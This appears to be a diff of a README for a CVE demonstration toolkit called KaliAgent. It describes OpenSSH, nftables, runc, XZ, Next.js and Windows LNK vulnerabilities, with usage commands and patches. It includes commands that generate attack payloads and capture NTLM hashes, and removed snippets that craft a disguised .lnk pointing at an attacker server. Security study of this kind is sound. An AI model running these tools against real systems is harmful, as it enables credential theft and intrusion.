@@ -3,136 +3,157 @@
 **Status:** ✅ Active
 **Version:** 1.0.0
 **Created:** April 28, 2026
+**CVEs:** 6 demonstrations
 
 ## Overview
 
-Phase 13 provides a structured framework for demonstrating, testing, and understanding real-world CVEs within the KaliAgent ecosystem. Each CVE demo is a self-contained module with:
+Phase 13 provides structured demonstrations of real-world CVEs. Each module includes:
+- Technical vulnerability explanation
+- Attack flow visualization
+- Working demonstration code
+- Detection signatures and guidance
+- Mitigation and patch information
 
-- **Vulnerability explanation** — Technical breakdown of the root cause
-- **Attack flow visualization** — Step-by-step attack chain diagram
-- **Payload generation** — Working exploit code that demonstrates the vulnerability
-- **Capture/detection server** — Server component to observe the exploit in action
-- **Detection guidance** — How to identify this attack in production
-- **Mitigation guidance** — Patches, workarounds, and hardening steps
+⚠️ **WARNING:** Only use on systems you own or have explicit written permission to test.
 
 ## Available CVEs
 
-| CVE | Description | Severity | Actively Exploited |
-|-----|-------------|----------|--------------------|
-| CVE-2026-32202 | Windows Shell LNK NTLM Hash Capture (CWE-693) | MEDIUM (4.3) | 🔴 YES |
+| CVE | Description | Severity | CWE | MITRE | Active Exploit |
+|-----|-------------|----------|-----|-------|---------------|
+| CVE-2024-6387 | OpenSSH regreSSHion RCE | CRITICAL 8.1 | CWE-362/479 | T1190 | 🔴 YES |
+| CVE-2024-1086 | Linux nftables use-after-free LPE | HIGH 7.8 | CWE-416 | T1068 | 🔴 YES |
+| CVE-2024-21626 | runc Container Escape (Leaky Vessels) | HIGH 8.6 | CWE-403 | T1611 | No |
+| CVE-2024-3094 | XZ Utils Supply Chain Backdoor | CRITICAL 10.0 | CWE-1395 | T1195.002 | 🔴 YES |
+| CVE-2025-29927 | Next.js Middleware Auth Bypass | CRITICAL 9.1 | CWE-285 | T1190 | 🔴 YES |
+| CVE-2026-32202 | Windows Shell LNK NTLM Hash Capture | MEDIUM 4.3 | CWE-693 | T1187 | 🔴 YES |
 
-## CVE-2026-32202: Windows Shell LNK NTLM Hash Capture
+## CVE Details
 
-### What It Does
+### CVE-2024-6387: OpenSSH regreSSHion RCE
 
-Protection mechanism failure in Windows Shell allows crafted `.lnk` files to trigger outbound NTLM/Kerberos authentication to an attacker-controlled server. The victim's NTLMv2 hash is captured for offline cracking or NTLM relay attacks.
+Race condition in OpenSSH's sshd SIGALRM handler allows remote unauthenticated code execution. The signal handler calls async-unsafe functions (syslog, malloc/free) that can corrupt the heap.
 
-### Attack Scenarios
-
-1. **File Share Browsing** — User browses a share with a crafted .lnk, hash sent automatically
-2. **Desktop Shortcut** — Malicious .lnk on desktop triggers auth on login
-3. **Search Indexer SYSTEM Hash** — Windows Search processes .lnk as SYSTEM account
-4. **NTLM Relay to Exchange** — Captured hash relayed (no cracking needed)
-
-### Usage
+**Demo tools:** SSH connection fuzzer, timing analyzer, KEXINIT manipulation, detection signatures
 
 ```bash
-# List available CVE demos
-python cve_agent.py list
-
-# Generate crafted .lnk files
-python cve_2026_32202.py generate --attacker 192.168.1.100
-
-# Start NTLM capture server
-python cve_2026_32202.py capture --port 445
-
-# Full demo (generate + capture)
-python cve_2026_32202.py demo --attacker 192.168.1.100
-
-# Show attack flow and scenarios
-python cve_2026_32202.py explain
-
-# Generate markdown report
-python cve_2026_32202.py report
+python cve_2024_6387.py explain          # Attack flow and scenarios
+python cve_2024_6387.py scan --target 10.0.0.1  # Check SSH server
+python cve_2024_6387.py generate --attacker 10.0.0.100  # Generate test payloads
+python cve_2024_6387.py report          # Full audit report
 ```
 
-### Files
+**Patches:** OpenSSH 9.8+, LoginGraceTime 0, UsePAM no
+
+### CVE-2024-1086: Linux nftables use-after-free LPE
+
+Use-after-free in `nft_verdict_init()` allows positive verdict values, causing double-free in `nf_tables`. Local attacker can achieve arbitrary kernel read/write → root.
+
+**Demo tools:** nftables rule fuzzer, UAF detector, privilege escalation checker, netlink socket manipulation
+
+```bash
+python cve_2024_1086.py explain         # Attack flow
+python cve_2024_1086.py scan            # Check kernel version
+python cve_2024_1086.py generate        # Generate test nftables rules
+python cve_2024_1086.py report          # Audit report
+```
+
+**Patches:** Kernel 6.8+, disable unprivileged `CAP_NET_ADMIN`
+
+### CVE-2024-21626: runc Container Escape (Leaky Vessels)
+
+File descriptor leak in runc exec allows container escape. `WORKDIR` set to `/proc/self/fd/` leaked fd → host filesystem access from inside container.
+
+**Demo tools:** Container escape detector, leaked FD scanner, runc version checker, Dockerfile analyzer
+
+```bash
+python cve_2024_21626.py explain        # Attack flow
+python cve_2024_21626.py scan           # Check runc version and FD leaks
+python cve_2024_21626.py generate       # Generate test containers
+python cve_2024_21626.py report         # Audit report
+```
+
+**Patches:** runc 1.1.12+, Docker 25.0.2+, seccomp profiles
+
+### CVE-2024-3094: XZ Utils Supply Chain Backdoor
+
+Sophisticated supply chain attack: malicious build scripts in xz 5.6.0/5.6.1 injected a backdoor into liblzma that targeted OpenSSH via systemd. The backdoor uses IFUNC resolvers to patch RSA_verify(), allowing Ed448 key holders to bypass SSH authentication.
+
+**Demo tools:** System audit (xz version, liblzma, sshd deps), build script analyzer, test file integrity checker
+
+```bash
+python cve_2024_3094.py explain         # Attack flow and supply chain breakdown
+python cve_2024_3094.py scan            # Audit system for backdoor indicators
+python cve_2024_3094.py scan --source-dir /path/to/xz-source  # Analyze source
+python cve_2024_3094.py report          # Audit report
+```
+
+**Patches:** xz 5.6.2+, or downgrade to 5.4.x. All major distros issued emergency updates.
+
+### CVE-2025-29927: Next.js Middleware Authorization Bypass
+
+The `x-middleware-subrequest` header bypasses all middleware-based authorization in Next.js. Middleware re-enters when processing internal subrequests, but the header is trusted from external sources.
+
+**Demo tools:** URL scanner with bypass header, payload script generator, middleware configuration analyzer
+
+```bash
+python cve_2025_29927.py explain        # Attack flow
+python cve_2025_29927.py scan https://app.example.com  # Test target
+python cve_2025_29927.py generate https://app.example.com  # Generate test script
+python cve_2025_29927.py report         # Audit report
+```
+
+**Patches:** Next.js 12.3.5, 13.5.9, 14.2.25, 15.2.3+
+
+### CVE-2026-32202: Windows Shell LNK NTLM Hash Capture
+
+Protection mechanism failure in Windows Shell allows crafted `.lnk` files to trigger outbound NTLM/Kerberos authentication. Zero-click via file share browsing, Search Indexer (SYSTEM), or MSSense.
+
+**Demo tools:** LNK file crafter (MS-SHLLINK spec), NTLM capture server (SMB1/SMB2), hashcat/John format output
+
+```bash
+python cve_2026_32202.py generate --attacker 192.168.1.100  # Create .lnk payloads
+python cve_2026_32202.py capture --port 445                  # Start hash capture
+python cve_2026_32202.py explain                              # Attack flow
+python cve_2026_32202.py demo --attacker 192.168.1.100       # Full demo
+python cve_2026_32202.py report                               # Report
+```
+
+**Patches:** KB5082198, KB5082123, KB5082200, KB5082052, KB5083769 (April 2026 Patch Tuesday)
+
+## Files
 
 ```
 phase13/
-├── README.md              — This file
-├── cve_agent.py           — Unified CVE demo integration agent
+├── README.md                    — This file
+├── __init__.py
+├── cve_agent.py                 — Unified CVE demo registry and runner
 └── cve_demos/
-    ├── cve_2026_32202.py  — Complete CVE-2026-32202 demo module
-    └── samples/           — Pre-generated .lnk sample files
-        ├── file_share_browsing_cve-2026-32202.lnk
-        ├── desktop_shortcut_cve-2026-32202.lnk
-        ├── search_indexer_system_hash_cve-2026-32202.lnk
-        └── ntlm_relay_to_exchange_cve-2026-32202.lnk
+    ├── __init__.py
+    ├── cve_2024_6387.py         — OpenSSH regreSSHion RCE
+    ├── cve_2024_1086.py          — Linux nftables use-after-free LPE
+    ├── cve_2024_21626.py          — runc container escape
+    ├── cve_2024_3094.py           — XZ Utils supply chain backdoor
+    ├── cve_2025_29927.py           — Next.js middleware bypass
+    ├── cve_2026_32202.py           — Windows Shell LNK NTLM capture
+    ├── quick_demo.py              — Quick demo for CVE-2026-32202
+    └── samples/                   — Pre-generated .lnk sample files
 ```
 
-## Technical Details: CVE-2026-32202
+## Quick Start
 
-### Root Cause
+```bash
+# List all available CVE demos
+python cve_agent.py list
 
-The `.lnk` binary format (MS-SHLLINK) contains a **LinkInfo** block that stores target path information. When a **CommonNetworkRelativeLink** with a UNC path is present, Windows Shell resolves it by initiating SMB authentication — sending the user's NTLMv2 hash to the UNC server.
+# Run a specific CVE demo
+python cve_agent.py run CVE-2024-6387 explain
+python cve_agent.py run CVE-2024-3094 scan
 
-The protection mechanism that should prevent authentication to arbitrary servers during .lnk resolution **fails**, allowing spoofing.
-
-### Key Code: LNK Crafting
-
-```python
-# The vulnerability core: LinkInfo with UNC path
-config = LNKConfig(
-    display_name="Q3_Report.pdf.lnk",      # What user sees
-    fake_target=r"C:\Docs\Q3_Report.pdf",   # Fake properties
-    unc_server=r"\\attacker-server",        # Where auth is sent
-    unc_share="share",
-    unc_path="docs"
-)
-
-craft = LNKCraft(config)
-lnk_data = craft.build()  # Generates MS-SHLLINK binary
+# Run individual modules directly
+python cve_2024_6387.py explain
+python cve_2024_1086.py scan
+python cve_2024_21626.py scan --target docker-host
+python cve_2024_3094.py scan
+python cve_2025_29927.py scan https://target.com
+python cve_2026_32202.py demo --attacker 192.168.1.100
 ```
-
-### Key Code: NTLM Capture
-
-```python
-# Minimal SMB server that captures NTLMv2 hashes
-server = NTLMCaptureServer(interface="0.0.0.0", port=445)
-server.start()
-
-# When a victim's Windows resolves the .lnk:
-# 1. SMB Negotiate → server responds with NTLMSSP Challenge
-# 2. Session Setup → server receives NTLMv2 AUTH
-# 3. Server extracts: domain, username, NTProofStr, Blob
-# 4. Server returns STATUS_ACCESS_DENIED
-# 5. Hash stored for cracking: hashcat -m 5600
-```
-
-### MITRE ATT&CK Mapping
-
-| Technique | ID | Description |
-|-----------|-----|-------------|
-| Forced Authentication | T1187 | Trigger auth to capture credentials |
-| SMB/Windows Admin Shares | T1021.002 | NTLM hash via SMB |
-| Pass-the-Hash | T1550.002 | Use captured hash directly |
-| NTLM Relay | T1557.001 | Relay auth to another service |
-| Forged Kerberos Tickets | T1606 | Silver Ticket from machine$ hash |
-
-### Microsoft Patches (April 2026)
-
-| Platform | KB |
-|----------|-----|
-| Windows 10 1607 | KB5082198 |
-| Windows 10 1809 | KB5082123 |
-| Windows 10 21H2/22H2 | KB5082200 |
-| Windows 11 23H2 | KB5082052 |
-| Windows 11 24H2/25H2 | KB5083769 |
-| Windows Server 2012 | KB5082127 |
-| Windows Server 2016 | KB5082198 |
-| Windows Server 2019 | KB5082123 |
-| Windows Server 2022 | KB5082142 |
-| Windows Server 2025 | KB5082063 |
-
-⚠️ **WARNING:** Only use on systems you own or have explicit written permission to test.
